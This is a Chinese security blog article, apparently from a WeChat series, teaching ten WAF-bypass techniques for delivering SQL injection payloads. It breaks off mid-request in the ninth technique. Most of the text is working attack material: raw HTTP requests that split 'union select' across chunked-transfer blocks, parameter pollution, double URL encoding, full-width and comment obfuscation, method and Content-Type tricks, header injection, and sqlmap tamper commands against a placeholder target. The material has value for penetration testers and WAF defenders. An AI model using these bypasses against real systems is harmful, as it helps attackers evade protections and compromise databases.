---
title: WAF绕过：你的payload一提交就被拦？这10个冷门技巧让它畅通无阻
url: https://mp.weixin.qq.com/s/0h5YHYXx1t78aQrQpGJy4w
source: Doonsec's feed
date: 2026-10-06
fetch_date: 2026-10-07T07:51:20.934342
---

# WAF绕过：你的payload一提交就被拦？这10个冷门技巧让它畅通无阻

# WAF绕过：你的payload一提交就被拦？这10个冷门技巧让它畅通无阻

原创

围巢安全笔记
围巢安全笔记

围巢安全笔记

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

> WEB 漏洞精讲 · 第 29 篇

上次打一个众测项目，SQL注入的payload刚提交就被WAF拦了，试了大小写、注释、URL编码，全没用。后来把请求体拆成一块一块的发过去——分块传输，WAF直接就瞎了，payload畅通无阻。那感觉就像拿着通行证，大摇大摆走过了安检门，安检员却啥也没看见。

这篇把WAF绕过的10个冷门技巧讲透，每个都附原理和实战命令，约 3500 字，附 2 个冷门干货。

---

## 01｜先搞懂WAF是怎么拦你的

在讲绕过之前，得先搞懂WAF是怎么检测攻击的。不然你只会瞎试，不知道为什么成功，也不知道为什么失败。

WAF（Web应用防火墙）的检测方式主要分三代：

* **第一代：特征匹配**——最常见的方式，WAF有一个攻击特征库，你的请求里只要匹配到特征（比如union select、`<script>`、and 1=1），就被拦了。优点是简单，缺点是容易绕过
* **第二代：语义分析**——高级一点的WAF，会分析你的请求语义，判断是不是攻击，而不是简单的特征匹配。比如它会解析SQL语句，判断是不是注入，而不是只看有没有union这个词
* **第三代：机器学习**——最新的WAF，用机器学习模型判断是不是攻击，准确率更高，但也更容易被对抗样本绕过

目前市面上90%的WAF还是以特征匹配为主，所以绕过的核心思路就是——**让你的payload在WAF眼里看起来不像攻击，但在Web服务器眼里还是攻击**。说白了就是骗WAF，但不骗Web服务器。

![WAF拦截payload](https://mmbiz.qpic.cn/mmbiz_jpg/8m3icSM3btkficlXcB9FHXziaVlUjSffEVHf1SxYhuQTvnibtTKj4icFPHpwTM7Iic8PQhDqZzDFsbKKwAejg6okptK3OwicQUxu4Zr7jAGocficmPE/640?wx_fmt=jpeg&from=appmsg)*正常的SQL注入payload一提交就被WAF拦截，返回403*

---

## 02｜技巧1：分块传输绕过（亲测最有效）

分块传输是HTTP/1.1的一个特性，允许把请求体分成一块一块的发送。很多WAF不会重组分块的数据，所以你把payload拆成一块一块的，WAF看到的是乱七八糟的碎片，检测不到攻击特征，但Web服务器会正常重组并执行。

这个方法是我亲测最有效的WAF绕过方式，基本上能通杀大部分WAF，包括某狗、某盾、某塔。

![分块传输绕过WAF成功](https://mmbiz.qpic.cn/sz_mmbiz_jpg/8m3icSM3btkcp8RDoibsKqpE2jQwcicFvwZbxVcBiaBppH15Q8FPNZnZ6uXEfah6jDcpWiaOMsalKB0xttvzBTYibTMuRoLQTT0ibqwAycZficrXgUk/640?wx_fmt=jpeg&from=appmsg)*Burp里用分块传输绕过WAF，payload被拆成多个块，成功返回500（注入成功)*

```
 # 正常的POST请求（被WAF拦）：
 POST /test.php HTTP/1.1
 Host: target.com
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 30

 id=1 union select 1,2,3-- -

 # 分块传输的POST请求（绕过WAF）：
 POST /test.php HTTP/1.1
 Host: target.com
 Content-Type: application/x-www-form-urlencoded
 Transfer-Encoding: chunked

 1e
 id=1 union select 1,2,3-- -
 0

 # 关键改动：
 # 1. 把 Content-Length 头删掉
 # 2. 加上 Transfer-Encoding: chunked
 # 3. 请求体的格式变成：块大小(十六进制)\r\n块内容\r\n
 # 4. 最后一个块是 0 ，表示结束
 # 5. 最后还要有一个空行

 # 更骚的操作：把关键字拆到不同的块里
 # 比如把 union 拆成 un 和 ion：
 a
 id=1 un
 b
 ion sele
 c
 ct 1,2,3-- -
 0

 # WAF看到的是：id=1 un / ion sele / ct 1,2,3-- -
 # 每一块都没有完整的攻击特征，WAF就放行了
 # 但Web服务器会把这些块拼起来，变成完整的payload
 # 这就是分块传输绕过的精髓
```

---

## 03｜技巧2：HTTP参数污染（HPP）

HTTP参数污染就是——给同一个参数传多个值。比如 `?id=1&id=2`。不同的Web服务器处理方式不一样：有的取第一个值，有的取最后一个值，有的两个都取。

WAF可能只检查第一个参数的值，觉得没问题就放行了，但Web服务器取的是最后一个值，实际执行的是攻击payload。

```
 # 正常的payload（被WAF拦）：
 /test.php?id=1 union select 1,2,3-- -

 # HTTP参数污染（绕过WAF）：
 /test.php?id=1&id=union select 1,2,3-- -

 # WAF检查第一个id=1，觉得没问题，放行
 # 但PHP/Apache会取最后一个id的值
 # 实际执行的是 id=union select 1,2,3-- -

 # 不同Web服务器的处理方式（很重要）：
 # PHP/Apache：取最后一个值
 # ASP/IIS：取最后一个值
 # JSP/Tomcat：取第一个值
 # Python/Flask：取第一个值
 # Node.js/Express：取第一个值（但会返回数组）

 # 所以如果目标是PHP，就把攻击payload放在最后一个参数
 # 如果目标是JSP，就把攻击payload放在第一个参数

 # 还可以用不同的参数名污染：
 /test.php?id=1&uid=union select 1,2,3-- -
 # 如果WAF只检查id参数，不检查uid参数
 # 而Web服务器把uid当id用（比如代码里写了$_REQUEST）
 # 就绕过了

 # 还有更骚的：用数组参数
 /test.php?id[]=1&id[]=union select 1,2,3-- -
 # 有些WAF不检查数组参数
 # 但PHP会把它解析成数组，可能触发注入
```

---

## 04｜技巧3-5：编码组合绕过

### 技巧3：多次URL编码绕过

WAF可能只解码一次，而Web服务器会解码多次。你把payload编码两次，WAF解码一次之后看到的是乱码，就放行了，Web服务器解码两次之后看到的是正常的payload。

```
 # 正常payload：
 union select

 # 一次URL编码：
 %75%6e%69%6f%6e%20%73%65%6c%65%63%74

 # 两次URL编码（把%也编码成%25）：
 %2575%256e%2569%256f%256e%2520%2573%2565%256c%2565%2563%2574

 # WAF解码一次之后看到的是 %75%6e... ，觉得不是攻击，放行
 # Web服务器解码两次之后看到的是 union select ，正常执行

 # 还可以三次、四次编码
 # 只要Web服务器解码次数比WAF多，就能绕过

 # 注意：不是所有Web服务器都会自动多次解码
 # Apache默认会解码一次
 # Nginx默认会解码一次
 # 但如果有反向代理（比如Nginx转发到Apache）
 # 就可能解码两次，这时候多次编码就有效了
```

### 技巧4：全角字符绕过

有些WAF不识别全角字符，而Web服务器（特别是IIS和ASP.NET）会把全角字符转成半角。你用全角字符写payload，WAF检测不到，Web服务器能正常解析。

```
 # 正常payload：
 union select

 # 全角字符：
 ｕｎｉｏｎ ｓｅｌｅｃｔ

 # 每个字母都有对应的全角字符：
 # a=ａ b=ｂ c=ｃ d=ｄ e=ｅ f=ｆ g=ｇ
 # h=ｈ i=ｉ j=ｊ k=ｋ l=ｌ m=ｍ n=ｎ
 # o=ｏ p=ｐ q=ｑ r=ｒ s=ｓ t=ｔ u=ｕ
 # v=ｖ w=ｗ x=ｘ y=ｙ z=ｚ

 # 还可以混合用：
 uｎiｏn sｅlｅｃｔ
 # 一半半角一半全角，WAF更难检测

 # 这个方法对IIS/ASP.NET特别有效
 # 因为IIS会自动把全角字符转成半角
 # 对Apache/Nginx效果一般
```

### 技巧5：注释和空白符绕过

在SQL关键字中间加注释、换行、Tab、空格，WAF的特征匹配可能检测不到，但MySQL会忽略这些，正常执行。

```
 # 正常payload：
 union select

 # 加注释：
 un/**/ion se/**/lect
 union/*!50000select*/
 union/*xxxxxxxxxxxxxxxxxxxx*/select

 # 加换行：
 un
 ion
 se
 lect

 # 加Tab：
 unionselect

 # 加括号：
 union(select)
 union/**/(select)

 # 加其他空白符（MySQL还认识这些）：
 # %09 = Tab
 # %0a = 换行
 # %0b = 垂直Tab
 # %0c = 换页
 # %0d = 回车
 # %a0 = 不间断空格（这个很多WAF不认识）

 # 比如：
 union%a0select
 # 用%a0代替空格，很多WAF检测不到
 # 但MySQL认识%a0，会当成空格处理

 # 这些方式可以组合使用，效果更好：
 un/**/ion%a0se/**/lect
 # 注释+全角空格+注释，WAF基本检测不到
```

> 💡 **干货：sqlmap tamper脚本大全——自动绕过WAF**
>
> 手动改payload太麻烦了，用sqlmap的tamper脚本自动绕过，效率高10倍：
>
> ```
>  # 常用的tamper脚本（按效果排序）：
>
>  # 1. space2comment —— 把空格换成/**/
>  # 2. space2hash —— 把空格换成#%0a（MySQL注释）
>  # 3. space2plus —— 把空格换成+
>  # 4. space2mssqlblank —— 把空格换成其他空白符（%09%0a%0b%0c%0d）
>  # 5. charencode —— 全部URL编码
>  # 6. charunicodeencode —— Unicode编码（%u00xx）
>  # 7. multiplespaces —— 一个空格换成多个空格
>  # 8. randomcase —— 随机大小写
>  # 9. between —— 用between代替=号
>  # 10. ifnull2ifisnull —— 用if(isnull())代替ifnull()
>  # 11. apostrophemask —— 把单引号换成%EF%BC%87（全角引号）
>  # 12. equaltolike —— 用like代替=号
>  # 13. unionalltounion —— 把union all select换成union select
>  # 14. lowercase —— 全部转小写
>  # 15. uppercase —— 全部转大写
>
>  # 使用方法（单个tamper）：
>  sqlmap -u "http://target.com/test.php?id=1" --tamper=space2comment
>
>  # 多个tamper组合使用（效果更好）：
>  sqlmap -u "http://target.com/test.php?id=1" --tamper=space2comment,randomcase,charencode,between
>
>  # 还有个神器参数：--skip-waf
>  # sqlmap会自动尝试各种绕过方式
>  sqlmap -u "http://target.com/test.php?id=1" --skip-waf
>
>  # 注意：tamper不是越多越好
>  # 有些tamper组合会冲突，导致payload失效
>  # 建议从单个开始试，不行再加
> ```
>
> 用tamper脚本自动绕过，比手动改payload效率高多了，而且不容易漏。

---

## 05｜技巧6-8：协议层面绕过

### 技巧6：HTTP协议版本绕过

有些WAF只检查HTTP/1.1的请求，你把请求改成HTTP/1.0，WAF可能就不做深度检测了。但Web服务器还是能正常处理。

```
 # 正常请求：
 GET /test.php?id=1 union select 1,2,3-- - HTTP/1.1
 Host: target.com

 # 改成HTTP/1.0：
 GET /test.php?id=1 union select 1,2,3-- - HTTP/1.0
 Host: target.com

 # 有些WAF对HTTP/1.0的请求不做深度检测
 # 因为HTTP/1.0没有长连接、没有分块传输
 # WAF觉得HTTP/1.0的请求比较简单，就不仔细查了
 # 但Web服务器还是能正常处理HTTP/1.0的请求
```

### 技巧7：请求方法绕过

有些WAF只检查GET和POST请求，你把请求方法改成PUT、DELETE、PATCH、OPTIONS、HEAD，WAF可能就不检查了。但Web服务器可能还是能正常处理参数。

```
 # 正常POST请求：
 POST /test.php HTTP/1.1
 Host: target.com
 Content-Type: application/x-www-form-urlencoded

 id=1 union select 1,2,3-- -

 # 改成PUT请求：
 PUT /test.php HTTP/1.1
 Host: target.com
 Content-Type: application/x-www-form-urlencoded

 id=1 union select 1,2,3-- -

 # 改成DELETE请求：
 DELETE /test.php?id=1 union select 1,2,3-- - HTTP/1.1
 Host: target.com

 # 有些WAF不检查PUT/DELETE/PATCH请求
 # 但PHP的$_REQUEST还是能获取到参数
 # 因为$_REQUEST包含了GET、POST、COOKIE的参数
 # 不管你用什么请求方法，只要参数在，就能获取到

 # 还有个更骚的：用HEAD请求
 # HEAD请求和GET请求一样，但服务器只返回响应头，不返回响应体
 # 有些WAF不检查HEAD请求
 # 但服务器还是会执行SQL查询
 # 你可以通过响应头的差异来判断注入是否成功
```

### 技巧8：Content-Type绕过

有些WAF只检查 `application/x-www-form-urlencoded` 的POST请求，你把Content-Type改成 `multipart/form-data` 或者 `text/plain`，WAF可能就不检查了。但Web服务器还是能正常解析参数。

```
 # 正常的Content-Type（WAF会检查）：
 Content-Type: application/x-www-form-urlencoded

 # 改成multipart/form-data（WAF可能不检查）：
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

 ------WebKitFormBoundary
 Content-Disposition: form-data; name="id"

 1 union select 1,2,3-- -
 ------WebKitFormBoundary--

 # 改成text/plain（WAF可能不检查）：
 Content-Type: text/plain

 id=1 union select 1,2,3-- -

 # 改成application/json（WAF可能不检查）：
 Content-Type: application/json

 {"id":"1 union select 1,2,3-- -"}

 # 有些WAF只检查特定Content-Type的请求体
 # 换成其他Content-Type，WAF就跳过检查了
 # 但Web服务器还是能正常解析参数
 # 特别是PHP的$_REQUEST，不管什么Content-Type都能解析
```

---

## 06｜技巧9-10：终极绕过

### 技巧9：请求头注入

这是最骚的绕过方式——把payload放在请求头里，WAF根本不会检查请求头的内容。但有些Web应用会把请求头的值存到数据库里，就触发SQL注入了。

```
 # 原理：
 # 有些Web应用会记录请求头到数据库
 # 比如User-Agent、Referer、X-Forwarded-For、Client-IP
 # 如果这些值没有过滤，就存在SQL注入

 # 攻击方法：
 # 1. 把payload放在User-Agent里
 GET /test.php HTTP/1.1
 Host: target.com
 User-Agent: 1' union select 1,2,3-- -

 # 2. 把payload放在Referer里
 GET /test.php HTTP/1.1
 Host: target.com
 Referer: 1' union select 1,2,3-- -

 # 3. 把payload放在X-Forwarded-For里
 GET /test.php HTT...